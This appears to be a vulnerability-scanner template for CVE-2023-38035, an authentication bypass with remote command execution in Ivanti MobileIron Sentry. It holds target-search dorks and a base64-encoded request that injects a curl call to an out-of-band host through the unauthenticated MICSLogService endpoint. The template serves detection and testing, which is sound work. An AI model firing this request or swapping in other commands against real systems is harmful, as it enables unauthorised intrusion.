id: CVE-2023-38035

info:
  name: Ivanti Sentry - Authentication Bypass
  author: DhiyaneshDk,iamnoooob,rootxharsh
  severity: critical
  description: |
    A security vulnerability in MICS Admin Portal in Ivanti MobileIron Sentry versions 9.18.0 and below, which may allow an attacker to bypass authentication controls on the administrative interface due to an insufficiently restrictive Apache HTTPD configuration.
    SHODAN: html:"Note: Requires a local Sentry administrative user"
    FOFA: title="Ivanti MobileIron Sentry"
    ZoomEye: app:"Ivanti MobileIron Sentry"
  reference:
    - https://forums.ivanti.com/s/article/CVE-2023-38035-API-Authentication-Bypass-on-Sentry-Administrator-Interface
    - https://www.horizon3.ai/ivanti-sentry-authentication-bypass-cve-2023-38035-deep-dive/
    - https://github.com/horizon3ai/CVE-2023-38035
    - https://nvd.nist.gov/vuln/detail/CVE-2023-38035
    - http://packetstormsecurity.com/files/174643/Ivanti-Sentry-Authentication-Bypass-Remote-Code-Execution.html
  tags: packetstorm,cve,cve2023,ivanti,mobileiron,sentry,kev,rce,auth-bypass,oast

set:
  b1: base64Decode("YwEAbQAYdXBsb2FkRmlsZVVzaW5nRmlsZUlucHV0TVMAB2NvbW1hbmRTAEw=")
  b2: base64Decode("UwAGaXNSb290VHpOeg==")
  randstr: randomLowercase(33) # ceye.io is randomLowercase(33)
  oob: oob()
  oobHTTP: oob.HTTP
rules:
  r0:
    request:
      method: POST
      path: /mics/services/MICSLogService
      headers:
        Content-Type: application/json
      body: |
        {{b1}}curl {{oobHTTP}}?{{randstr}}{{b2}}
    expression: oobCheck(oob, oob.ProtocolHTTP, 3)
expression: r0()
